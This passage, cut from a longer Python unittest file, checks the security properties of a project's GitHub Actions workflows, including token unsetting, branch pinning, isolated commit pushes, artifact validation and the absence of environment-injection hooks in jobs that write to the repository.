        for job_id in ("backup", "controller_production", "controller_nonproduction"):
            with self.subTest(job_id=job_id):
                job = jobs[job_id]
                for marker in (
                    "DEPENDENCY_SHA256",
                    "RUNTIME_MANIFEST_SHA256",
                    "WORKFLOW_BLOB_OID",
                    'git diff --quiet "$SOURCE_COMMIT" HEAD -- "$package_root"',
                    'git rev-parse "HEAD:$WORKFLOW_PATH"',
                ):
                    self.assertIn(marker, job)
        for job_id in ("prepare", "open", "finalize"):
            with self.subTest(persist_job=job_id):
                job = jobs[job_id]
                self.assertIn('git rev-parse "$parent:$WORKFLOW_PATH"', job)
                self.assertIn(
                    'git show "$parent:state/AUTOPILOT_RUNTIME_MANIFEST.json"',
                    job,
                )
                self.assertIn(
                    'git diff --quiet "$WORKFLOW_SOURCE_COMMIT" "$parent" -- "${runtime_paths[@]}"',
                    job,
                )

    def test_production_rollbacks_use_source_pinned_verified_runtime(self):
        critical = self.jobs("uaart_critical.yml")["rollback_execute"]
        watchdog_jobs = self.jobs("uaart_transaction_watchdog.yml")
        watchdog = watchdog_jobs["rollback_open"]
        for job in (critical, watchdog):
            for marker in (
                "PINNED_ROOT",
                "SOURCE_COMMIT",
                'git -c core.hooksPath=/dev/null worktree add --detach',
                "UAART_PINNED_DURABLE_STATE_COPIED",
                "UAART_PINNED_RUNTIME_CLOSURE_VALIDATED",
                "PINNED_SOURCE_COMMIT_BINDING",
                "target.resolve() != target",
                'cd "$PINNED_ROOT"',
            ):
                self.assertIn(marker, job)
        self.assertIn("UAART_PINNED_RECOVERY_IDENTITY_VALIDATED", watchdog)
        self.assertIn(
            "steps.orphan.outputs.transaction_status == 'ROLLING_BACK'", watchdog
        )
        self.assertIn(
            "steps.orphan.outputs.source_commit == needs.discover.outputs.source_commit",
            watchdog,
        )
        self.assertIn("steps.pinned.outputs.validated == 'true'", watchdog)
        discover = watchdog_jobs["discover"]
        self.assertIn(
            "source_commit: ${{ steps.orphan.outputs.source_commit }}", discover
        )
        self.assertIn("claim_path: ${{ steps.orphan.outputs.claim_path }}", discover)

    def test_all_production_state_writers_bind_runtime_before_repo_python(self):
        expected = {
            "uaart_critical.yml": {
                "prepare", "open", "finalize", "recover", "rollback_mark",
            },
            "uaart_transaction_watchdog.yml": {
                "halt_discovery_failure", "halt_preparing", "mark_rollback",
                "finalize_rollback", "halt_rolling_back", "halt_recovery_failure",
            },
        }
        forbidden = (
            "GITHUB_ENV", "GITHUB_PATH", "BASH_ENV", "PYTHONSTARTUP",
            "PYTHONPATH", "PYTHONHOME", "GIT_CONFIG_GLOBAL", ".gitconfig",
        )
        for name, expected_jobs in expected.items():
            jobs = self.jobs(name)
            writers = {
                job_id for job_id, job in jobs.items()
                if "contents: write" in job
            }
            self.assertEqual(writers, expected_jobs)
            for job_id in sorted(writers):
                with self.subTest(workflow=name, job=job_id):
                    job = jobs[job_id]
                    first_repo_python = job.find("python3 -I automation/")
                    self.assertGreaterEqual(first_repo_python, 0)
                    guards = [
                        job.find("UAART_TRUSTED_RUNTIME_CLOSURE_VALIDATED"),
                        job.find(
                            'git diff --quiet "$WORKFLOW_SOURCE_COMMIT" HEAD -- '
                            '"${runtime_paths[@]}"'
                        ),
                        job.find("UAART_SOURCE_PINNED_WRITER_RUNTIME_VALIDATED"),
                    ]
                    guards = [value for value in guards if value >= 0]
                    self.assertTrue(guards)
                    self.assertLess(min(guards), first_repo_python)
                    for marker in forbidden:
                        self.assertNotIn(marker, job)
    def test_write_token_is_unset_before_repository_python(self):
        for name in ("uaart_critical.yml", "uaart_transaction_watchdog.yml"):
            for block in self.steps(name):
                if "github.token" not in block:
                    continue
                unset_at = block.find("unset GH_TOKEN")
                self.assertGreaterEqual(unset_at, 0)
                first_python = CP.PYTHON_INTERPRETER_RE.search(block)
                if "Wait in strict Production queue and refresh main" in block:
                    repo_at = block.find("python3 -I automation/")
                    self.assertGreaterEqual(repo_at, 0)
                    self.assertLess(
                        block.find("UAART_TRUSTED_RUNTIME_CLOSURE_VALIDATED"),
                        repo_at,
                    )
                    self.assertLess(
                        block.find("python3 -I automation/production_queue.py wait"),
                        unset_at,
                    )
                elif first_python is not None:
                    self.assertLess(unset_at, first_python.start())

    def test_critical_production_rerun_is_halt_only(self):
        jobs = self.jobs("uaart_critical.yml")
        for job_id in (
            "prepare",
            "backup",
            "open",
            "controller_production",
            "finalize",
            "rollback_mark",
            "rollback_execute",
        ):
            with self.subTest(job_id=job_id):
                header = jobs[job_id].split("\n    steps:", 1)[0]
                self.assertIn("github.run_attempt == 1", header)
        recover_header = jobs["recover"].split("\n    steps:", 1)[0]
        self.assertNotIn("github.run_attempt == 1", recover_header)
        self.assertIn("needs.finalize.result != 'success'", recover_header)
        self.assertIn("control_plane.py halt-system", jobs["recover"])
        rollback_import_steps = [
            block
            for block in self.steps("uaart_critical.yml")
            if (
                "Download rollback receipt outside checkout" in block
                or "Strictly validate data-only rollback artifact" in block
            )
        ]
        self.assertEqual(len(rollback_import_steps), 2)
        for block in rollback_import_steps:
            self.assertIn("github.run_attempt == 1", block)

    def test_critical_rollback_recovery_allows_expired_launch_ledger(self):
        validation_steps = [
            block
            for block in self.steps("uaart_critical.yml")
            if "Validate durable one-shot rollback reservation" in block
        ]
        self.assertEqual(len(validation_steps), 1)
        block = validation_steps[0]
        self.assertIn("--allow-halt-for-recovery", block)
        self.assertIn("control_plane.py verify-request", block)
        self.assertIn("transaction_watchdog.py discover", block)
        self.assertNotIn("control_plane.py verify-identity", block)
        for binding in (
            "pending_count",
            "transaction_status",
            "transaction_id",
            "transaction_path",
            "request_path",
            "request_sha256",
            "run_id",
            "task_id",
        ):
            self.assertIn(binding, block)

    def test_git_write_credentials_are_scoped_to_trusted_steps(self):
        for name in (
            "uaart_autostart.yml",
            "uaart_orchestrator.yml",
            "uaart_fast.yml",
            "uaart_standard.yml",
            "uaart_critical.yml",
            "uaart_backup.yml",
            "uaart_maintenance.yml",
            "uaart_monitor.yml",
            "uaart_transaction_watchdog.yml",
        ):
            with self.subTest(name=name):
                value = self.read(name)
                self.assertNotIn("persist-credentials: true", value)
                for block in self.steps(name):
                    if "github.token" not in block:
                        continue
                    self.assertTrue(
                        "production_queue.py" in block
                        or "extraheader" in block,
                        block.splitlines()[0],
                    )
                    self.assertFalse(CP._task_execution_commands(block))

    def test_sensitive_routes_are_hard_pinned_to_main(self):
        for name in (
            "uaart_orchestrator.yml",
            "uaart_fast.yml",
            "uaart_standard.yml",
            "uaart_critical.yml",
            "uaart_maintenance.yml",
            "uaart_monitor.yml",
            "uaart_transaction_watchdog.yml",
        ):
            with self.subTest(name=name):
                value = self.read(name)
                self.assertIn("github.ref == 'refs/heads/main'", value)
                self.assertNotRegex(value, r"(?i)github\s*\.\s*ref_name|\bGITHUB_REF_NAME\b")
                checkout_steps = [
                    block for block in self.steps(name)
                    if "uses: actions/checkout@" in block
                ]
                self.assertTrue(checkout_steps)
                for block in checkout_steps:
                    self.assertEqual(
                        len(re.findall(r"(?m)^\s+ref:\s*main\s*$", block)), 1
                    )

    def test_privileged_pushes_use_isolated_commit_trees(self):
        for name in (
            "uaart_autostart.yml",
            "uaart_orchestrator.yml",
            "uaart_fast.yml",
            "uaart_standard.yml",
            "uaart_critical.yml",
            "uaart_transaction_watchdog.yml",
        ):
            with self.subTest(name=name):
                value = self.read(name)
                self.assertNotRegex(value, r"(?m)^\s*git\s+rebase\b")
                pushes = [
                    block for block in self.steps(name)
                    if re.search(r"\bpush\s+origin\b", block)
                ]
                self.assertTrue(pushes)
                for block in pushes:
                    for marker in (
                        "GIT_INDEX_FILE",
                        "RUNNER_TEMP",
                        "git read-tree",
                        "git commit-tree",
                        "COMMIT:refs/heads/main",
                    ):
                        self.assertIn(marker, block)
                    self.assertNotRegex(
                        block, r"\bpush\s+origin\s+[^\n]*\bHEAD(?::|\b)"
                    )
                    push_lines = [
                        line for line in block.splitlines()
                        if re.search(r"\bpush\s+origin\b", line)
                    ]
                    self.assertTrue(push_lines)
                    self.assertTrue(all(
                        "COMMIT:refs/heads/main" in line for line in push_lines
                    ))

    def test_cross_runner_artifacts_are_temp_bound_and_data_only_validated(self):
        for name in (
            "uaart_orchestrator.yml",
            "uaart_fast.yml",
            "uaart_standard.yml",
            "uaart_critical.yml",
            "uaart_transaction_watchdog.yml",
        ):
            with self.subTest(name=name):
                relative = ".github/workflows/" + name
                downloads = 0
                for job_id, job in self.jobs(name).items():
                    permission = CP._job_contents_permission(job, relative, job_id)
                    for block in CP._named_job_step_blocks(job, relative, job_id):
                        if "uses: actions/download-artifact@" not in block:
                            continue
                        downloads += 1
                        self.assertNotRegex(
                            block, r"(?i)(?:GITHUB_WORKSPACE|github\.workspace)"
                        )
                        self.assertRegex(
                            block,
                            r"(?m)^\s+path:\s*(?:\$RUNNER_TEMP|\$\{\{\s*runner\.temp\s*\}\})/\S+\s*$",
                        )
                        if permission == "write":
                            self.assertIn(
                                CP.DATA_ONLY_ARTIFACT_VALIDATION_MARKER, job
                            )
                self.assertGreaterEqual(downloads, 1)

    def test_all_durable_pushes_have_bounded_retry(self):
        for name in (
            "uaart_autostart.yml",
            "uaart_orchestrator.yml",
            "uaart_fast.yml",
            "uaart_standard.yml",
            "uaart_critical.yml",
            "uaart_transaction_watchdog.yml",
        ):
            with self.subTest(name=name):
                for block in self.steps(name):
                    if "push origin" in block:
                        self.assertIn("for attempt in 1 2 3 4 5 6", block)
                        self.assertIn("fetch", block)
                        self.assertIn("merge-base --is-ancestor", block)

    def test_watchdog_push_retry_accepts_an_already_persisted_commit(self):
        pushes = [
            block for block in self.steps("uaart_transaction_watchdog.yml")
            if "push origin" in block
        ]
        self.assertEqual(len(pushes), 6)
        for block in pushes:
            self.assertIn("LAST_COMMIT=''", block)
            self.assertIn(
                'git merge-base --is-ancestor "$LAST_COMMIT" "$PARENT"', block
            )
            self.assertIn(
                'git diff --quiet "$LAST_COMMIT" "$PARENT" -- "${ACCEPTED_PATHS[@]}"',
                block,
            )
            self.assertIn('LAST_COMMIT="$COMMIT"', block)

        critical_pushes = [
            block for block in self.steps("uaart_critical.yml")
            if "push origin" in block
        ]
        self.assertEqual(len(critical_pushes), 5)
        for block in critical_pushes:
            self.assertIn(
                'git diff --quiet "$last_commit" "$parent" -- "${accepted_paths[@]}"',
                block,
            )

        mark = [block for block in pushes if "arm rollback" in block]
        self.assertEqual(len(mark), 1)
        self.assertEqual(mark[0].count("echo 'marked=true'"), 2)

    def test_watchdog_open_recovery_is_not_blocked_by_existing_halt(self):
        jobs = self.jobs("uaart_transaction_watchdog.yml")
        mark = jobs["mark_rollback"]
        rollback = jobs["rollback_open"]
        mark_header = mark.split("\n    steps:", 1)[0]

        self.assertIn("transaction_status == 'OPEN'", mark_header)
        self.assertIn("rollback_receipt_present == 'false'", mark_header)
        self.assertNotIn("halt_present == 'false'", mark_header)
        self.assertNotIn("WATCHDOG_ROLLBACK_MARK_HALTED", mark)
        self.assertNotIn("test ! -e state/AUTOPILOT_HALT.json", mark)
        self.assertNotIn("test ! -e state/AUTOPILOT_HALT.json", rollback)
        self.assertIn("--allow-halt-for-recovery", mark)
        self.assertIn("--allow-halt-for-recovery", rollback)

    def test_only_central_callers_inherit_repository_secrets(self):
        inheritors = {
            name
            for name in ACTIVE
            if re.search(r"(?m)^\s*secrets:\s*inherit\s*$", self.read(name))
        }
        self.assertEqual(
            inheritors, {"uaart_autostart.yml", "uaart_orchestrator.yml"}
        )

    def test_readonly_support_workflows_have_isolated_python_and_checkouts(self):
        for name in (
            "uaart_backup.yml",
            "uaart_maintenance.yml",
            "uaart_monitor.yml",
        ):
            with self.subTest(name=name):
                relative = ".github/workflows/" + name
                jobs = self.jobs(name)
                self.assertEqual(len(jobs), 1)
                job_id, job = next(iter(jobs.items()))
                self.assertEqual(
                    CP._job_contents_permission(job, relative, job_id), "read"
                )
                checkouts = [
                    block for block in self.steps(name)
                    if "uses: actions/checkout@" in block
                ]
                self.assertEqual(len(checkouts), 1)
                self.assertEqual(
                    checkouts[0].count("persist-credentials: false"), 1
                )
                for block in self.steps(name):
                    body = CP._step_run_body(block, relative)
                    if body is not None:
                        self.assertNotIn("${{", body)
        for name in ("uaart_maintenance.yml", "uaart_monitor.yml"):
            with self.subTest(main_pinned=name):
                job = next(iter(self.jobs(name).values()))
                header = job.split("\n    steps:", 1)[0]
                self.assertIn("if: github.ref == 'refs/heads/main'", header)
                checkout = next(
                    block for block in self.steps(name)
                    if "uses: actions/checkout@" in block
                )
                self.assertEqual(checkout.count("ref: main"), 1)
                self.assertEqual(checkout.count("clean: true"), 1)

    def test_maintenance_enforces_runtime_policy_and_unit_tests(self):
        value = self.read("uaart_maintenance.yml")
        self.assertIn("control_plane.py verify-mode --require AUTOMATIC", value)
        self.assertIn("unittest discover -s automation/packages/task107_r2", value)
        self.assertNotIn("uaart_rollback.yml", value)


if __name__ == "__main__":
    unittest.main()
